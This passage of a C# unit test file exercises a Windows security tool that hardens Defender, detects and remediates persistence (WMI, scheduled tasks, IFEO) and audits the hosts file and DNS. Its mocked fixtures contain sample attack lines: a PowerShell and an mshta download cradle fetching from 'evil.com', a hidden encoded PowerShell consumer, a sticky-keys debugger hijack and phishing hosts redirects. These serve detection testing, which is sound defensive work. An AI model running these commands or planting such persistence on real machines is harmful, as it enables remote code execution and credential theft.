            Assert.Equal(3, status.TotalAsrRulesCount);
            Assert.True(status.IsPuaProtectionEnabled);
            Assert.True(status.IsControlledFolderAccessEnabled);
        }

        [Fact]
        public void T1_F15_02_DashboardSentinel_PersistenceHunt_CalculatesSeverityMetrics()
        {
            var report = new PersistenceScanReport
            {
                TotalItemsScanned = 150,
                Threats = new List<PersistenceThreatItem>
                {
                    new() { Severity = ThreatSeverity.Critical },
                    new() { Severity = ThreatSeverity.Critical },
                    new() { Severity = ThreatSeverity.High },
                    new() { Severity = ThreatSeverity.Medium }
                }
            };

            Assert.Equal(4, report.ThreatCount);
            Assert.Equal(2, report.CriticalCount);
            Assert.Equal(1, report.HighCount);
            Assert.Equal(150, report.TotalItemsScanned);
        }

        [Fact]
        public void T1_F15_03_DashboardSentinel_DnsHostsSummary_ComputesSeverityCounts()
        {
            var report = new DnsHostsGuardReport
            {
                HostsFilePath = @"C:\Windows\System32\drivers\etc\hosts",
                HostsFileExists = true,
                TotalHostsEntries = 10,
                SuspiciousEntries = new List<HostsEntry>
                {
                    new() { Severity = ThreatSeverity.Critical },
                    new() { Severity = ThreatSeverity.High },
                    new() { Severity = ThreatSeverity.Medium },
                    new() { Severity = ThreatSeverity.Low }
                }
            };

            Assert.True(report.HasSuspiciousRedirects);
            Assert.True(report.HasThreats);
            Assert.Equal(1, report.CriticalCount);
            Assert.Equal(1, report.HighCount);
            Assert.Equal(1, report.MediumCount);
            Assert.Equal(1, report.LowCount);
        }

        [Fact]
        public void T1_F15_04_DashboardSentinel_CalculatesCompositeScoreReduction()
        {
            int baseScore = 100;
            int vulnCount = 2;
            int persistenceThreatCount = 3;
            int hostsThreatCount = 1;

            int computedScore = Math.Max(0, baseScore - (vulnCount * 15) - (persistenceThreatCount * 10) - (hostsThreatCount * 10));
            Assert.Equal(30, computedScore);
        }

        [Fact]
        public async Task T1_F15_05_DashboardSentinel_RemediationBatch_ProducesStructuredResults()
        {
            var mockWmi = new Mock<IWmiSubscriptionService>();
            var engine = new PersistenceScannerEngine(
                new Mock<IPersistenceRegistryService>().Object,
                mockWmi.Object,
                new Mock<IScheduledTaskService>().Object,
                new Mock<IProcessProvider>().Object,
                new Mock<IFileSystemProvider>().Object,
                new Mock<IDigitalSignatureValidator>().Object);

            var threats = new List<PersistenceThreatItem>
            {
                new() { Id = "T1", Category = "WMI Persistence", TargetType = "WMI", AdditionalData = "C1|F1" },
                new() { Id = "T2", Category = "WMI Persistence", TargetType = "WMI", AdditionalData = "C2|F2" }
            };

            var results = await engine.RemediateAllAsync(threats);
            Assert.Equal(2, results.Count);
            Assert.All(results, r => Assert.True(r.Success));
        }

        #endregion

        // ═════════════════════════════════════════════════════════════════════
        // TIER 2: BOUNDARY & CORNER CASES (BVA & Adversarial Edge Conditions)
        // ═════════════════════════════════════════════════════════════════════

        #region Tier 2: Boundary & Corner Cases

        [Theory]
        [InlineData("75668C1F-73B5-4CF0-BB93-3ECF5CB7CC84")] // Block Office Process Injection (SupportsWarn = false)
        [InlineData("92E97FA1-2EDF-4476-BDD6-9DD0B4DDDC7B")] // Block Win32 API from Macros (SupportsWarn = false)
        [InlineData("E6DB77E5-3DF2-4CF1-B95A-636979351E5B")] // Block WMI Persistence (SupportsWarn = false)
        [InlineData("9E6C4E1F-7D60-472F-BA1A-A39EF669E4B2")] // Block LSASS Credential Theft (SupportsWarn = false)
        [InlineData("D1E49AAC-8F56-4280-B9BA-993A6D77406C")] // Block PSExec & WMI (SupportsWarn = false)
        public async Task T2_BVA_01_AsrRules_WarnModeOnUnsupportedRules_EnforcesBlockModePerSpec(string guid)
        {
            var mockReg = new Mock<IRegistryService>();
            var engine = new DefenderHardenerEngine(mockReg.Object, new Mock<IProcessRunner>().Object);

            var res = await engine.SetAsrRuleStateAsync(guid, AsrRuleState.Warn);
            Assert.True(res.Success);
            Assert.Contains("enforced Block mode", res.Output);
            mockReg.Verify(r => r.SetDword(RegistryHive.LocalMachine, It.IsAny<string>(), guid, (int)AsrRuleState.Block), Times.Once);
        }

        [Fact]
        public async Task T2_BVA_02_AsrRules_HandlesInvalidGuid_ReturnsFailureWithoutException()
        {
            var engine = new DefenderHardenerEngine(new Mock<IRegistryService>().Object, new Mock<IProcessRunner>().Object);
            var res = await engine.SetAsrRuleStateAsync("INVALID-GUID-12345", AsrRuleState.Block);

            Assert.False(res.Success);
            Assert.Contains("Unknown ASR rule GUID", res.ErrorMessage);
        }

        [Fact]
        public async Task T2_BVA_03_DefenderStatus_HandlesCorruptedOrStringRegistryValues()
        {
            var mockReg = new Mock<IRegistryService>();
            var dict = new Dictionary<string, object>
            {
                { "BE9BA2D9-53EA-4CDC-84E5-9B1EEEE46550", "1" }, // String representation
                { "D4F940AB-401B-4EFC-AADC-AD5F3C50688A", 999 }, // Out of range integer
                { "5BEB7EFE-FD9A-4556-801D-275E5FFC04CC", "6" }  // Warn string
            };
            mockReg.Setup(r => r.GetValues(RegistryHive.LocalMachine, It.IsAny<string>())).Returns(dict);

            var engine = new DefenderHardenerEngine(mockReg.Object, new Mock<IProcessRunner>().Object);
            var status = await engine.GetStatusAsync();

            var emailRule = status.AsrRules.First(r => r.Guid == "BE9BA2D9-53EA-4CDC-84E5-9B1EEEE46550");
            Assert.Equal(AsrRuleState.Block, emailRule.State);

            var officeRule = status.AsrRules.First(r => r.Guid == "D4F940AB-401B-4EFC-AADC-AD5F3C50688A");
            Assert.Equal(AsrRuleState.Off, officeRule.State); // Out of range maps to Off

            var scriptRule = status.AsrRules.First(r => r.Guid == "5BEB7EFE-FD9A-4556-801D-275E5FFC04CC");
            Assert.Equal(AsrRuleState.Warn, scriptRule.State);
        }

        [Theory]
        [InlineData("127.0.0.1 localhost # comment 1 # comment 2 # comment 3")]
        [InlineData("127.0.0.1   localhost\t\t#\tmultiple tabs and hashes\t#")]
        [InlineData("::1 localhost # ipv6 loopback #")]
        public void T2_BVA_04_HostsParser_HandlesMultipleConsecutiveInlineCommentsAndTabs(string line)
        {
            var entries = DnsHostsGuardEngine.ParseHostsLines(new[] { line });
            var entry = Assert.Single(entries);
            Assert.Equal("localhost", entry.Hostname);
        }

        [Theory]
        [InlineData("127.0.0.1")]                        // Missing hostname
        [InlineData("google.com 127.0.0.1")]             // Inverted tokens (Hostname first)
        [InlineData("999.999.999.999 example.com")]      // Out of range IPv4
        [InlineData("2001:xyz::1 example.com")]          // Corrupted IPv6 hex
        [InlineData("# 127.0.0.1 comment.local")]        // Pure comment
        public void T2_BVA_05_HostsParser_DiscardsMalformedInvertedOrInvalidLines(string line)
        {
            var entries = DnsHostsGuardEngine.ParseHostsLines(new[] { line });
            Assert.Empty(entries);
        }

        [Theory]
        [InlineData("127.0.0.1", "127.0.0.1", true)]
        [InlineData("127.255.255.254", "127.255.255.254", true)]
        [InlineData("0.0.0.0", "0.0.0.0", false)]
        [InlineData("10.0.0.1", "10.0.0.1", true)]
        [InlineData("172.16.0.1", "172.16.0.1", true)]
        [InlineData("172.31.255.254", "172.31.255.254", true)]
        [InlineData("172.15.255.255", "172.15.255.255", false)] // Untrusted / Outside RFC 1918
        [InlineData("172.32.0.1", "172.32.0.1", false)]         // Untrusted / Outside RFC 1918
        [InlineData("192.168.0.1", "192.168.0.1", true)]
        [InlineData("100.64.0.1", "100.64.0.1", true)]           // CGNAT
        [InlineData("100.127.255.254", "100.127.255.254", true)] // CGNAT
        [InlineData("100.63.255.255", "100.63.255.255", false)] // Untrusted / Outside CGNAT
        [InlineData("100.128.0.1", "100.128.0.1", false)]       // Untrusted / Outside CGNAT
        [InlineData("198.51.100.1", "198.51.100.1", false)]     // Rogue Public IP
        public void T2_BVA_06_DnsResolver_EvaluatesExactSubnetBoundaries(string ip, string _, bool expectedTrusted)
        {
            var classification = DnsHostsGuardEngine.ClassifyDnsServer(ip);
            Assert.Equal(expectedTrusted, classification.IsTrusted);
        }

        [Fact]
        public async Task T2_BVA_07_ScheduledTask_HandlesTruncatedOrMalformedBase64PowerShell()
        {
            var mockTaskService = new Mock<IScheduledTaskService>();
            mockTaskService.Setup(t => t.QueryTasksAsync(It.IsAny<CancellationToken>())).ReturnsAsync(new List<ScheduledTaskInfo>
            {
                new() { TaskName = @"\Test\CorruptedB64", TaskToRun = "powershell.exe -enc AAAAAA==INVALID_PADDING", HasSecurityDescriptor = true }
            });

            var engine = new PersistenceScannerEngine(
                new Mock<IPersistenceRegistryService>().Object,
                new Mock<IWmiSubscriptionService>().Object,
                mockTaskService.Object,
                new Mock<IProcessProvider>().Object,
                new Mock<IFileSystemProvider>().Object,
                new Mock<IDigitalSignatureValidator>().Object);

            var report = await engine.ScanAsync();
            var threat = Assert.Single(report.Threats);
            Assert.Equal("LOLBAS Scheduled Task", threat.Category);
        }

        [Theory]
        [InlineData("sethc.exe")]
        [InlineData("utilman.exe")]
        [InlineData("osk.exe")]
        [InlineData("taskmgr.exe")]
        [InlineData("magnify.exe")]
        [InlineData("narrator.exe")]
        [InlineData("displayswitch.exe")]
        [InlineData("AtBroker.exe")]
        public async Task T2_BVA_08_IfeoAuditor_MonitorsCompleteAccessibilityBinaryCatalog(string exe)
        {
            var mockReg = new Mock<IPersistenceRegistryService>();
            string ifeoKey = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options";
            mockReg.Setup(r => r.GetSubKeyNames(RegistryHive.LocalMachine, RegistryView.Registry64, ifeoKey)).Returns(new[] { exe });
            mockReg.Setup(r => r.GetString(RegistryHive.LocalMachine, RegistryView.Registry64, $@"{ifeoKey}\{exe}", "Debugger")).Returns("cmd.exe");

            var engine = new PersistenceScannerEngine(
                mockReg.Object,
                new Mock<IWmiSubscriptionService>().Object,
                new Mock<IScheduledTaskService>().Object,
                new Mock<IProcessProvider>().Object,
                new Mock<IFileSystemProvider>().Object,
                new Mock<IDigitalSignatureValidator>().Object);

            var report = await engine.ScanAsync();
            var threat = Assert.Single(report.Threats);
            Assert.Equal(ThreatSeverity.Critical, threat.Severity);
            Assert.Contains(exe, threat.Name);
        }

        #endregion

        // ═════════════════════════════════════════════════════════════════════
        // TIER 3: CROSS-FEATURE COMBINATIONS & PAIRWISE INTEGRATION
        // ═════════════════════════════════════════════════════════════════════

        #region Tier 3: Cross-Feature Combinations & Pairwise

        [Fact]
        public async Task T3_Pairwise_01_DefenderEnterpriseHardening_CombinedWith_HostsFileCleanRestore()
        {
            // Workflow: Enterprise hardens Defender baseline while simultaneously repairing tampered hosts file
            var mockReg = new Mock<IRegistryService>();
            var mockRunner = new Mock<IProcessRunner>();
            var defenderEngine = new DefenderHardenerEngine(mockReg.Object, mockRunner.Object);

            var mockFileService = new Mock<IHostsFileService>();
            var mockFlusher = new Mock<IDnsCacheFlusher>();
            mockFileService.Setup(f => f.GetHostsPath()).Returns(@"C:\Windows\System32\drivers\etc\hosts");
            mockFileService.Setup(f => f.FileExists(It.IsAny<string>())).Returns(true);
            mockFlusher.Setup(f => f.FlushResolverCache()).Returns(true);
            var hostsEngine = new DnsHostsGuardEngine(mockFileService.Object, new Mock<IDnsAdapterAuditor>().Object, mockFlusher.Object);

            // Step 1: Enable enterprise Defender hardening
            var defenderRes = await defenderEngine.EnableEnterpriseHardeningAsync();
            Assert.True(defenderRes.Success);

            // Step 2: Restore hosts file
            var hostsRes = await hostsEngine.RestoreDefaultHostsFileAsync();
            Assert.True(hostsRes.Success);
            Assert.True(hostsRes.CacheFlushed);

            // Verify pairwise side-effects
            mockReg.Verify(r => r.SetDword(RegistryHive.LocalMachine, @"SOFTWARE\Policies\Microsoft\Windows Defender", "PUAProtection", 1), Times.Once);
            mockFileService.Verify(f => f.WriteAllText(It.IsAny<string>(), It.IsAny<string>()), Times.Once);
            mockFlusher.Verify(f => f.FlushResolverCache(), Times.Once);
        }

        [Fact]
        public async Task T3_Pairwise_02_PersistenceThreatScan_FollowedBy_BatchRemediation_And_CleanReScan()
        {
            // Workflow: Scan multi-vector persistence threats, batch remediate, then re-scan to confirm clean state
            var mockWmi = new Mock<IWmiSubscriptionService>();
            var mockTask = new Mock<IScheduledTaskService>();

            bool isRemediated = false;

            mockWmi.Setup(w => w.GetConsumers()).Returns(() => isRemediated
                ? new List<WmiEventConsumerInfo>()
                : new List<WmiEventConsumerInfo> { new() { Name = "RogueConsumer", ConsumerType = "CommandLineEventConsumer", CommandLineTemplate = "evil.exe" } });
            mockWmi.Setup(w => w.GetFilters()).Returns(() => isRemediated
                ? new List<WmiEventFilterInfo>()
                : new List<WmiEventFilterInfo> { new() { Name = "RogueFilter", Query = "SELECT * FROM __InstanceCreationEvent" } });
            mockWmi.Setup(w => w.GetBindings()).Returns(() => isRemediated
                ? new List<WmiBindingInfo>()
                : new List<WmiBindingInfo> { new() { ConsumerName = "RogueConsumer", FilterName = "RogueFilter" } });

            mockTask.Setup(t => t.QueryTasksAsync(It.IsAny<CancellationToken>())).ReturnsAsync(() => isRemediated
                ? new List<ScheduledTaskInfo>()
                : new List<ScheduledTaskInfo> { new() { TaskName = @"\EvilTask", TaskToRun = "powershell.exe -w hidden -c (New-Object Net.WebClient).DownloadString('http://evil.com')", HasSecurityDescriptor = true } });

            mockTask.Setup(t => t.DeleteTaskAsync(It.IsAny<string>(), It.IsAny<CancellationToken>())).ReturnsAsync(true);

            var engine = new PersistenceScannerEngine(
                new Mock<IPersistenceRegistryService>().Object,
                mockWmi.Object,
                mockTask.Object,
                new Mock<IProcessProvider>().Object,
                new Mock<IFileSystemProvider>().Object,
                new Mock<IDigitalSignatureValidator>().Object);

            // 1. Initial Scan (Detects 2 threats)
            var initialReport = await engine.ScanAsync();
            Assert.Equal(2, initialReport.ThreatCount);

            // 2. Batch Remediate
            var remediationResults = await engine.RemediateAllAsync(initialReport.Threats);
            Assert.Equal(2, remediationResults.Count);
            Assert.All(remediationResults, r => Assert.True(r.Success));

            // 3. Mark state as remediated and re-scan
            isRemediated = true;
            var followUpReport = await engine.ScanAsync();
            Assert.Equal(0, followUpReport.ThreatCount);
        }

        [Fact]
        public void T3_Pairwise_03_CliSecurityEngines_SequentialExecution_ReturnsValidJsonPayloads()
        {
            // Pairwise test running each security engine via CLI framework with --json and verifying schema
            var ctxDefender = CreateCliContext(isJson: true, isForce: false, isSilent: false, "sec", "defender-harden", "status");
            var ctxPersistence = CreateCliContext(isJson: true, isForce: false, isSilent: false, "sec", "persistence-audit", "scan");
            var ctxHosts = CreateCliContext(isJson: true, isForce: false, isSilent: false, "sec", "hosts-check", "status");

            var (code1, out1, _) = RunSecurityCommand(ctxDefender, "defender-harden");
            var (code2, out2, _) = RunSecurityCommand(ctxPersistence, "persistence-audit");
            var (code3, out3, _) = RunSecurityCommand(ctxHosts, "hosts-check");

            Assert.Equal(0, code1);
            Assert.Equal(0, code2);
            Assert.Equal(0, code3);

            using var doc1 = JsonDocument.Parse(out1);
            Assert.Equal(16, doc1.RootElement.GetProperty("TotalAsrRulesCount").GetInt32());

            using var doc2 = JsonDocument.Parse(out2);
            Assert.True(doc2.RootElement.TryGetProperty("TotalItemsScanned", out _));

            using var doc3 = JsonDocument.Parse(out3);
            Assert.True(doc3.RootElement.TryGetProperty("TotalHostsEntries", out _));
        }

        [Fact]
        public async Task T3_Pairwise_04_IncidentResponseWorkflow_CorrelatedThreatNeutralization()
        {
            // Correlate WMI payload + hosts sinkhole + rogue DNS and neutralize in a unified response workflow
            var mockWmi = new Mock<IWmiSubscriptionService>();
            mockWmi.Setup(w => w.GetConsumers()).Returns(new List<WmiEventConsumerInfo>
            {
                new() { Name = "BankingTrojanConsumer", ConsumerType = "CommandLineEventConsumer", CommandLineTemplate = "cmd.exe /c start banker.exe" }
            });
            mockWmi.Setup(w => w.GetFilters()).Returns(new List<WmiEventFilterInfo>
            {
                new() { Name = "BankingTrojanFilter", Query = "SELECT * FROM __InstanceCreationEvent" }
            });
            mockWmi.Setup(w => w.GetBindings()).Returns(new List<WmiBindingInfo>
            {
                new() { ConsumerName = "BankingTrojanConsumer", FilterName = "BankingTrojanFilter" }
            });

            var persistenceEngine = new PersistenceScannerEngine(
                new Mock<IPersistenceRegistryService>().Object,
                mockWmi.Object,
                new Mock<IScheduledTaskService>().Object,
                new Mock<IProcessProvider>().Object,
                new Mock<IFileSystemProvider>().Object,
                new Mock<IDigitalSignatureValidator>().Object);

            var mockFileService = new Mock<IHostsFileService>();
            mockFileService.Setup(f => f.GetHostsPath()).Returns(@"C:\Windows\System32\drivers\etc\hosts");
            mockFileService.Setup(f => f.FileExists(It.IsAny<string>())).Returns(true);
            mockFileService.Setup(f => f.ReadAllLines(It.IsAny<string>())).Returns(new[]
            {
                "198.51.100.25 chase.com",
                "127.0.0.1 update.microsoft.com"
            });

            var mockAuditor = new Mock<IDnsAdapterAuditor>();
            mockAuditor.Setup(a => a.AuditAdaptersAsync(It.IsAny<CancellationToken>())).ReturnsAsync(new List<AdapterDnsAuditItem>
            {
                new()
                {
                    AdapterName = "Wi-Fi",
                    DnsServers = new() { DnsHostsGuardEngine.ClassifyDnsServer("198.51.100.50") } // Rogue
                }
            });

            var mockFlusher = new Mock<IDnsCacheFlusher>();
            mockFlusher.Setup(f => f.FlushResolverCache()).Returns(true);

            var hostsEngine = new DnsHostsGuardEngine(mockFileService.Object, mockAuditor.Object, mockFlusher.Object);

            // Audit
            var persistReport = await persistenceEngine.ScanAsync();
            var hostsReport = await hostsEngine.AuditAsync();

            Assert.Equal(1, persistReport.ThreatCount);
            Assert.Equal(2, hostsReport.SuspiciousEntries.Count);
            Assert.True(hostsReport.HasRogueDns);

            // Remediate
            var persistRemediation = await persistenceEngine.RemediateAllAsync(persistReport.Threats);
            var hostsRestore = await hostsEngine.RestoreDefaultHostsFileAsync();

            Assert.All(persistRemediation, r => Assert.True(r.Success));
            Assert.True(hostsRestore.Success);
            Assert.True(hostsRestore.CacheFlushed);
        }

        #endregion

        // ═════════════════════════════════════════════════════════════════════
        // TIER 4: REAL-WORLD APPLICATION SCENARIOS
        // ═════════════════════════════════════════════════════════════════════

        #region Tier 4: Real-World Application Scenarios

        [Fact]
        public async Task T4_Scenario_01_EnterpriseWorkstationSecurityBaseline()
        {
            // Scenario 1: Enterprise Workstation Security Baseline (Defender ASR + PUA + CFA + Clean Hosts)
            var mockReg = new Mock<IRegistryService>();
            var mockRunner = new Mock<IProcessRunner>();
            var defenderEngine = new DefenderHardenerEngine(mockReg.Object, mockRunner.Object);

            var mockFileService = new Mock<IHostsFileService>();
            var mockFlusher = new Mock<IDnsCacheFlusher>();
            mockFileService.Setup(f => f.GetHostsPath()).Returns(@"C:\Windows\System32\drivers\etc\hosts");
            mockFileService.Setup(f => f.FileExists(It.IsAny<string>())).Returns(true);
            mockFlusher.Setup(f => f.FlushResolverCache()).Returns(true);
            var hostsEngine = new DnsHostsGuardEngine(mockFileService.Object, new Mock<IDnsAdapterAuditor>().Object, mockFlusher.Object);

            // Step 1: Initial audit shows non-hardened baseline
            mockReg.Setup(r => r.GetValues(RegistryHive.LocalMachine, It.IsAny<string>())).Returns(new Dictionary<string, object>());
            var initialStatus = await defenderEngine.GetStatusAsync();
            Assert.Equal(0, initialStatus.ActiveAsrRulesCount);
            Assert.False(initialStatus.IsPuaProtectionEnabled);

            // Step 2: Deploy Enterprise Hardening Policy
            var hardenerResult = await defenderEngine.EnableEnterpriseHardeningAsync();
            Assert.True(hardenerResult.Success);

            // Step 3: Enforce clean default hosts template
            var hostsResult = await hostsEngine.RestoreDefaultHostsFileAsync();
            Assert.True(hostsResult.Success);
            Assert.True(hostsResult.CacheFlushed);

            // Step 4: Verify all 16 ASR rules written in Block mode (1)
            foreach (var rule in DefenderHardenerEngine.KnownAsrRules)
            {
                mockReg.Verify(r => r.SetDword(RegistryHive.LocalMachine, @"SOFTWARE\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\ASR\Rules", rule.Guid, 1), Times.Once);
            }

            // Step 5: Verify PUA and CFA set to Block mode
            mockReg.Verify(r => r.SetDword(RegistryHive.LocalMachine, @"SOFTWARE\Policies\Microsoft\Windows Defender", "PUAProtection", 1), Times.Once);
            mockReg.Verify(r => r.SetDword(RegistryHive.LocalMachine, @"SOFTWARE\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\Controlled Folder Access", "EnableControlledFolderAccess", 1), Times.Once);
        }

        [Fact]
        public async Task T4_Scenario_02_RansomwareAndStealthTrojanPersistenceSweep()
        {
            // Scenario 2: Ransomware & Stealth Trojan Persistence Sweep (WMI + Scheduled Tasks + IFEO + Temp binaries)
            var mockReg = new Mock<IPersistenceRegistryService>();
            var mockWmi = new Mock<IWmiSubscriptionService>();
            var mockTask = new Mock<IScheduledTaskService>();
            var mockProcess = new Mock<IProcessProvider>();
            var mockFs = new Mock<IFileSystemProvider>();
            var mockSig = new Mock<IDigitalSignatureValidator>();

            // Setup multi-vector ransomware infection
            // 1. WMI subscription
            mockWmi.Setup(w => w.GetConsumers()).Returns(new List<WmiEventConsumerInfo>
            {
                new() { Name = "RansomDropper", ConsumerType = "CommandLineEventConsumer", CommandLineTemplate = "cmd.exe /c start ransom.exe" }
            });
            mockWmi.Setup(w => w.GetFilters()).Returns(new List<WmiEventFilterInfo>
            {
                new() { Name = "RansomFilter", Query = "SELECT * FROM __InstanceCreationEvent" }
            });
            mockWmi.Setup(w => w.GetBindings()).Returns(new List<WmiBindingInfo>
            {
                new() { ConsumerName = "RansomDropper", FilterName = "RansomFilter" }
            });

            // 2. Scheduled Task LOLBAS download cradle
            mockTask.Setup(t => t.QueryTasksAsync(It.IsAny<CancellationToken>())).ReturnsAsync(new List<ScheduledTaskInfo>
            {
                new() { TaskName = @"\Stealth\RansomwareTask", TaskToRun = "mshta.exe http://evil.com/payload.hta", HasSecurityDescriptor = true }
            });
            mockTask.Setup(t => t.DeleteTaskAsync(It.IsAny<string>(), It.IsAny<CancellationToken>())).ReturnsAsync(true);

            // 3. IFEO Sticky Keys Backdoor
            string ifeoKey = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options";
            mockReg.Setup(r => r.GetSubKeyNames(RegistryHive.LocalMachine, RegistryView.Registry64, ifeoKey)).Returns(new[] { "sethc.exe" });
            mockReg.Setup(r => r.GetString(RegistryHive.LocalMachine, RegistryView.Registry64, $@"{ifeoKey}\sethc.exe", "Debugger")).Returns("cmd.exe");

            // 4. Staged unsigned binary in temp
            string stagedExe = Path.Combine(Path.GetTempPath(), "encryptor.exe");
            mockProcess.Setup(p => p.GetRunningProcesses()).Returns(new List<RunningProcessInfo>());
            mockFs.Setup(f => f.DirectoryExists(It.IsAny<string>())).Returns(true);
            mockFs.Setup(f => f.GetFiles(It.IsAny<string>(), "*.exe", SearchOption.TopDirectoryOnly)).Returns(new[] { stagedExe });
            mockFs.Setup(f => f.GetFileLength(stagedExe)).Returns(102400);
            mockFs.Setup(f => f.FileExists(stagedExe)).Returns(true);
            mockSig.Setup(v => v.ValidateSignature(stagedExe)).Returns(SignatureValidationResult.Unsigned());

            var engine = new PersistenceScannerEngine(mockReg.Object, mockWmi.Object, mockTask.Object, mockProcess.Object, mockFs.Object, mockSig.Object);

            // Act 1: Sweep for threats
            var scanReport = await engine.ScanAsync();
            Assert.Equal(4, scanReport.ThreatCount);
            Assert.Contains(scanReport.Threats, t => t.Category == "WMI Persistence");
            Assert.Contains(scanReport.Threats, t => t.Category == "LOLBAS Scheduled Task");
            Assert.Contains(scanReport.Threats, t => t.Category == "IFEO Hijack");
            Assert.Contains(scanReport.Threats, t => t.Category == "Unsigned Staged Binary");

            // Act 2: Neutralize all threats
            var remediationResults = await engine.RemediateAllAsync(scanReport.Threats);
            Assert.Equal(4, remediationResults.Count);
            Assert.All(remediationResults, r => Assert.True(r.Success));

            // Verify clean remediation actions invoked
            mockWmi.Verify(w => w.DeleteBinding("RansomDropper", "RansomFilter"), Times.Once);
            mockTask.Verify(t => t.DeleteTaskAsync(@"\Stealth\RansomwareTask", It.IsAny<CancellationToken>()), Times.Once);
            mockReg.Verify(r => r.DeleteValue(RegistryHive.LocalMachine, RegistryView.Registry64, $@"{ifeoKey}\sethc.exe", "Debugger"), Times.Once);
            mockFs.Verify(f => f.DeleteFile(stagedExe), Times.Once);
        }

        [Fact]
        public async Task T4_Scenario_03_BankingTrojanDnsHijackAndRecovery()
        {
            // Scenario 3: Banking Trojan DNS Hijack & Recovery (Sinkhole/Phishing hosts + Rogue DNS resolver detection + Atomic Restore)
            var mockFileService = new Mock<IHostsFileService>();
            var mockAuditor = new Mock<IDnsAdapterAuditor>();
            var mockFlusher = new Mock<IDnsCacheFlusher>();

            string hostsPath = @"C:\Windows\System32\drivers\etc\hosts";
            mockFileService.Setup(f => f.GetHostsPath()).Returns(hostsPath);
            mockFileService.Setup(f => f.FileExists(hostsPath)).Returns(true);
            mockFileService.Setup(f => f.ReadAllLines(hostsPath)).Returns(new[]
            {
                "127.0.0.1 localhost",
                "198.51.100.99 chase.com # Phishing redirect",
                "198.51.100.99 bankofamerica.com # Phishing redirect",
                "127.0.0.1 update.microsoft.com # AV update sinkhole",
                "127.0.0.1 virustotal.com # Intel sinkhole"
            });

            mockAuditor.Setup(a => a.AuditAdaptersAsync(It.IsAny<CancellationToken>())).ReturnsAsync(new List<AdapterDnsAuditItem>
            {
                new()
                {
                    AdapterName = "Ethernet 1",
                    DnsServers = new() { DnsHostsGuardEngine.ClassifyDnsServer("203.0.113.88") } // Rogue DNS Server
                }
            });
            mockFlusher.Setup(f => f.FlushResolverCache()).Returns(true);

            var engine = new DnsHostsGuardEngine(mockFileService.Object, mockAuditor.Object, mockFlusher.Object);

            // Step 1: Detect hijack state
            var auditReport = await engine.AuditAsync();
            Assert.True(auditReport.HasSuspiciousRedirects);
            Assert.True(auditReport.HasRogueDns);
            Assert.Equal(4, auditReport.SuspiciousEntries.Count);
            Assert.Equal(4, auditReport.CriticalCount); // chase.com, bankofamerica.com, update.microsoft.com, virustotal.com

            // Step 2: Perform atomic recovery
            var restoreResult = await engine.RestoreDefaultHostsFileAsync();
            Assert.True(restoreResult.Success);
            Assert.True(restoreResult.CacheFlushed);

            mockFileService.Verify(f => f.WriteAllText(It.IsAny<string>(), DnsHostsGuardEngine.Windows11DefaultHostsTemplate), Times.Once);
            mockFlusher.Verify(f => f.FlushResolverCache(), Times.Once);
        }

        [Fact]
        public void T4_Scenario_04_AutomatedDevSecOpsCiHardeningPipelineViaCli()
        {
            // Scenario 4: Automated DevSecOps CI Hardening Pipeline via CLI (`lf sec defender-harden`, `lf sec persistence-audit`, `lf sec hosts-check`)
            // Step 1: CI Pipeline triggers defender-harden status check
            var ctxStatus = CreateCliContext(isJson: true, isForce: false, isSilent: false, "sec", "defender-harden", "status");
            var (code1, out1, _) = RunSecurityCommand(ctxStatus, "defender-harden");
            Assert.Equal(0, code1);
            using var doc1 = JsonDocument.Parse(out1);
            Assert.Equal(16, doc1.RootElement.GetProperty("TotalAsrRulesCount").GetInt32());

            // Step 2: CI Pipeline runs persistence security audit
            var ctxAudit = CreateCliContext(isJson: true, isForce: false, isSilent: false, "sec", "persistence-audit", "scan");
            var (code2, out2, _) = RunSecurityCommand(ctxAudit, "persistence-audit");
            Assert.Equal(0, code2);
            using var doc2 = JsonDocument.Parse(out2);
            Assert.True(doc2.RootElement.TryGetProperty("TotalItemsScanned", out _));

            // Step 3: CI Pipeline verifies network name resolution integrity
            var ctxHosts = CreateCliContext(isJson: true, isForce: false, isSilent: false, "sec", "hosts-check", "status");
            var (code3, out3, _) = RunSecurityCommand(ctxHosts, "hosts-check");
            Assert.Equal(0, code3);
            using var doc3 = JsonDocument.Parse(out3);
            Assert.True(doc3.RootElement.TryGetProperty("TotalHostsEntries", out _));
        }

        [Fact]
        public async Task T4_Scenario_05_GuiDashboardLiveThreatHuntAndRecovery()
        {
            // Scenario 5: GUI Dashboard Live Threat Hunt & System Recovery workflows
            var defenderEngine = new DefenderHardenerEngine(new Mock<IRegistryService>().Object, new Mock<IProcessRunner>().Object);
            var mockWmi = new Mock<IWmiSubscriptionService>();
            mockWmi.Setup(w => w.GetConsumers()).Returns(new List<WmiEventConsumerInfo>
            {
                new() { Name = "SuspiciousConsumer", ConsumerType = "CommandLineEventConsumer", CommandLineTemplate = "powershell.exe -w hidden -enc AQID" }
            });
            mockWmi.Setup(w => w.GetFilters()).Returns(new List<WmiEventFilterInfo>
            {
                new() { Name = "SuspiciousFilter", Query = "SELECT * FROM __InstanceCreationEvent" }
            });
            mockWmi.Setup(w => w.GetBindings()).Returns(new List<WmiBindingInfo>
            {
                new() { ConsumerName = "SuspiciousConsumer", FilterName = "SuspiciousFilter" }
            });

            var persistenceEngine = new PersistenceScannerEngine(
                new Mock<IPersistenceRegistryService>().Object,
                mockWmi.Object,
                new Mock<IScheduledTaskService>().Object,
                new Mock<IProcessProvider>().Object,
                new Mock<IFileSystemProvider>().Object,
                new Mock<IDigitalSignatureValidator>().Object);

            var mockFileService = new Mock<IHostsFileService>();
            mockFileService.Setup(f => f.GetHostsPath()).Returns(@"C:\Windows\System32\drivers\etc\hosts");
            mockFileService.Setup(f => f.FileExists(It.IsAny<string>())).Returns(true);
            mockFileService.Setup(f => f.ReadAllLines(It.IsAny<string>())).Returns(new[] { "127.0.0.1 localhost" });
            var mockFlusher = new Mock<IDnsCacheFlusher>();
            mockFlusher.Setup(f => f.FlushResolverCache()).Returns(true);
            var hostsEngine = new DnsHostsGuardEngine(mockFileService.Object, new Mock<IDnsAdapterAuditor>().Object, mockFlusher.Object);

            // 1. Dashboard initiates live hunt
            var defenderStatus = await defenderEngine.GetStatusAsync();
            var persistenceReport = await persistenceEngine.ScanAsync();
            var hostsReport = await hostsEngine.AuditAsync();

            Assert.NotNull(defenderStatus);
            Assert.Equal(1, persistenceReport.ThreatCount);
